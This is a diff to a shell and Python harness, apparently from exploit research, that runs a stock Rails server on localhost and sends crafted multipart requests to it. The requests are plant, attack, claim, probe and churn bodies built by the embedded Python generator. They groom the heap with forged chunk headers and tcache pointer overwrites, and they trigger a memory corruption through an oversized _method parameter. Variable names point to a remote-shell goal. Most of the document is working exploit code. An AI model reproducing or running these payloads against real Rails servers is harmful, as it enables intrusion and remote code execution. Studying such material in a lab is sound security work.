@@ -37,9 +37,12 @@ if [ "${1:-}" = "--one" ]; then
   i="$2"; PORT=$((BASE + i)); TAG="$TAGP-$i"
   LOG="$EV/stock-rails-$TAG.server.log"
   PIDF="$PWD/$EV/stock-rails-$TAG.pid"
-  ARM="$PWD/$EV/stock-rails-$TAGP.case-arm"
+  ARM="$PWD/$EV/stock-rails-$TAG.case-arm"
   rm -f "$ARM"
-  MTRACE_FD=2 MTRACE_FREE_DUMP=1 MTRACE_CASE_REQUEST=$((N + 44)) \
+  THREAD_ENV=()
+  [ "${RUBY2SHELL_CLAIM_THREADS:-0}" = 1 ] && THREAD_ENV=(RAILS_MAX_THREADS=1)
+  env "${THREAD_ENV[@]}" MTRACE_FD=2 MTRACE_FREE_DUMP=1 \
+    MTRACE_CASE_REQUEST=$((N + 44)) \
     MTRACE_CASE_ARM_FILE="$ARM" MTRACE_EMIT_ARM_FILE="$ARM" \
     LD_PRELOAD="$PWD/lab/preload/mtrace.so" \
     "$RB" "$APP/bin/rails" server -b 127.0.0.1 -p "$PORT" --pid "$PIDF" \
@@ -64,6 +67,19 @@ if [ "${1:-}" = "--one" ]; then
       -w '%{http_code}' 2>>"$LOG")
     [ "$GAP" != 0 ] && sleep "$GAP"
   fi
+
+  # benign small-part churn: sub-embed-floor parts allocate no big buffers
+  # (no scans, no pool consumption) but create per-request objects that
+  # grow the old generation, forcing the major GC that frees the plant's
+  # promoted chunks before the attack's upcase
+  CHURN="${RUBY2SHELL_CLAIM_CHURN:-0}"
+  if [ "$CHURN" != 0 ] && [ -f "$PFX.churn.body" ]; then
+    for _ in $(seq 1 "$CHURN"); do
+      curl -s -m 10 -X POST "http://127.0.0.1:$PORT/not-a-route" \
+        -H 'Content-Type: multipart/form-data; boundary=XB' -H 'Expect:' \
+        --data-binary "@$PFX.churn.body" -o /dev/null 2>>"$LOG"
+    done
+  fi
   P2=$(curl -s -m 30 -X POST "http://127.0.0.1:$PORT/not-a-route" \
     -H 'Content-Type: multipart/form-data; boundary=XB' -H 'Expect:' \
     --data-binary "@$PFX.attack.body" -o "$EV/stock-rails-$TAG.attack.html" \
@@ -72,6 +88,13 @@ if [ "${1:-}" = "--one" ]; then
     -H 'Content-Type: multipart/form-data; boundary=XB' -H 'Expect:' \
     --data-binary "@$PFX.claim.body" -o "$EV/stock-rails-$TAG.claim.html" \
     -w '%{http_code}' 2>>"$LOG")
+  P4=NA
+  if [ "${RUBY2SHELL_CLAIM_MODE:-strip}" = poison ]; then
+    P4=$(curl -s -m 30 -X POST "http://127.0.0.1:$PORT/not-a-route" \
+      -H 'Content-Type: multipart/form-data; boundary=XB' -H 'Expect:' \
+      --data-binary "@$PFX.probe.body" -o "$EV/stock-rails-$TAG.probe.html" \
+      -w '%{http_code}' 2>>"$LOG")
+  fi
   rm -f "$ARM"
   A1=$(curl -s -m 5 "http://127.0.0.1:$PORT/up" -o /dev/null -w '%{http_code}' 2>>"$LOG")
   ALIVE=NO
@@ -81,7 +104,7 @@ if [ "${1:-}" = "--one" ]; then
     kill "$PID" 2>/dev/null
   fi
   wait "$PID" 2>/dev/null
-  echo "$TAG plant=$P1 attack=$P2 claim=$P3 up=$A1 alive=$ALIVE" >> "$PFX.summary"
+  echo "$TAG plant=$P1 attack=$P2 claim=$P3 probe=$P4 up=$A1 alive=$ALIVE" >> "$PFX.summary"
   exit 0
 fi
 
@@ -98,36 +121,62 @@ rm -f "$PFX".*.body "$EV"/stock-rails-"$TAGP"-*.{server.log,html,maps,pid} \
       "$PFX.summary" "$EV"/stock-rails-"$TAGP"-*.excerpt.txt "$PFX".case-arm 2>/dev/null
 
 EV_DIR="$EV" TAG="$TAGP" PLANT_SPEC="$PLANT_SPEC" CLAIM_LIST="$CLAIM_LIST" \
+CLAIM_MODE="${RUBY2SHELL_CLAIM_MODE:-strip}" \
 python3 - "$N" <<'PY'
 import sys, os
 n = int(sys.argv[1])
 ev, tag = os.environ['EV_DIR'], os.environ['TAG']
+mode = os.environ['CLAIM_MODE']
 def part(name, content, ctype):
     return (b'--XB\r\nContent-Disposition: form-data; name="' + name +
             b'"\r\nContent-Type: ' + ctype + b'\r\n\r\n' + content)
 AB = b'text/plain; charset=ASCII-8BIT'
 pattern = (0x250).to_bytes(8, 'little') + (0x90).to_bytes(8, 'little')
-drain = (pattern * ((1024 + 15) // 16))[:1024]
-parts = [part(f'd{i}'.encode(), drain, AB) for i in range(32)]
 method = b'a' + b'\xdf' * (n - 5) + b'\x00\x00\x51\x02'
-parts.append(part(b'_method', method, b'text/plain; charset=ISO-8859-1'))
+if mode == 'poison':
+    # poison arm: no drain parts (the only pre-upcase 0x410-class alloc is
+    # the _method part's own parse slice); f filler keeps the geometry tail
+    parts = [part(b'_method', method, b'text/plain; charset=ISO-8859-1')]
+else:
+    drain = (pattern * ((1024 + 15) // 16))[:1024]
+    parts = [part(f'd{i}'.encode(), drain, AB) for i in range(32)]
+    parts.append(part(b'_method', method, b'text/plain; charset=ISO-8859-1'))
 parts.append(part(b'f', (pattern * 16)[:256], AB))
 open(f'{ev}/stock-rails-{tag}.attack.body', 'wb').write(
     b'\r\n'.join(parts) + b'\r\n--XB--\r\n')
-def strip_content(fill, size):
-    # value-buffer content with a sane fake "next chunk" header at the
-    # 0x350 dead-strip offset (unsorted/consolidation consumers read it)
+def p64(v):
+    return v.to_bytes(8, 'little')
+def plant_content(size):
+    # content ~1008B: slice AND value both 0x410-class (slice request
+    # max(1024, content+9)); the neighbor chunk's user bytes at +0x40
+    # carry the unsorted-scan forgery (prev_size match + sane next size)
+    # for the grown 0x453 victim; 976B parts feed tcache[0x3f0]
+    if mode == 'poison':
+        return (b'p' * 0x40 + p64(0x450) + p64(0x91) +
+                b'p' * (size - 0x50))
     if size >= 864:
-        return (fill * 848 + (0).to_bytes(8, 'little') +
-                (0x91).to_bytes(8, 'little') + fill * (size - 864))
-    return fill * size
+        return (b'p' * 848 + p64(0) + p64(0x91) + b'p' * (size - 864))
+    return b'p' * size
+def claim_content(size):
+    if mode == 'poison':
+        # 0x450-class exact-fit claim over the grown 0x453 victim: the
+        # 1081-byte write overshoots the physical 0x410 extent by 49
+        # bytes onto the neighbor's [prev,size] header and tcache
+        # next/key at content offsets 0x408..0x420; the head pair covers
+        # the slice-reuse variant
+        head = p64(0x4141414141414141) + p64(0x4242424242424242)
+        return (head + b'Z' * 0x3f8 + p64(0x411) + head +
+                b'Z' * (size - 0x420))
+    if size >= 864:
+        return (b'Z' * 848 + p64(0) + p64(0x91) + b'Z' * (size - 864))
+    return b'Z' * size
 pp = []
 for grp in os.environ['PLANT_SPEC'].split(','):
     if not grp:
         continue
     size, count = (int(v, 0) for v in grp.split('x'))
     for _ in range(count):
-        pp.append(part(f'p{len(pp)}'.encode(), strip_content(b'p', size), AB))
+        pp.append(part(f'p{len(pp)}'.encode(), plant_content(size), AB))
 open(f'{ev}/stock-rails-{tag}.plant.body', 'wb').write(
     b'\r\n'.join(pp) + b'\r\n--XB--\r\n')
 cp = []
@@ -135,10 +184,36 @@ for v in os.environ['CLAIM_LIST'].split(','):
     if not v:
         continue
     size = int(v, 0)
-    cp.append(part(f'c{len(cp)}'.encode(), strip_content(b'Z', size), AB))
+    cp.append(part(f'c{len(cp)}'.encode(), claim_content(size), AB))
 open(f'{ev}/stock-rails-{tag}.claim.body', 'wb').write(
     b'\r\n'.join(cp) + b'\r\n--XB--\r\n')
+if mode == 'poison':
+    qp = []
+    for grp in os.environ.get('PROBE_SPEC', '1016x12').split(','):
+        if not grp:
+            continue
+        size, count = (int(v, 0) for v in grp.split('x'))
+        for _ in range(count):
+            qp.append(part(f'q{len(qp)}'.encode(), b'Q' * size, AB))
+    open(f'{ev}/stock-rails-{tag}.probe.body', 'wb').write(
+        b'\r\n'.join(qp) + b'\r\n--XB--\r\n')
+    hp = []
+    for grp in os.environ.get('CHURN_SPEC', '400x20').split(','):
+        if not grp:
+            continue
+        size, count = (int(v, 0) for v in grp.split('x'))
+        for _ in range(count):
+            hp.append(part(f'h{len(hp)}'.encode(), b'h' * size, AB))
+    open(f'{ev}/stock-rails-{tag}.churn.body', 'wb').write(
+        b'\r\n'.join(hp) + b'\r\n--XB--\r\n')
 PY
+
+for f in "$PFX.attack.body" "$PFX.plant.body" "$PFX.claim.body"; do
+  [ -f "$f" ] || { echo "body builder failed: $f" >&2; exit 2; }
+done
+if [ "${RUBY2SHELL_CLAIM_MODE:-strip}" = poison ] && [ ! -f "$PFX.probe.body" ]; then
+  echo "body builder failed: $PFX.probe.body" >&2; exit 2
+fi
 
 # geometry check: at N=588 the attack body must be byte-identical to the
 # surviving chosen-header forge run's wire input (cov-n588 family)
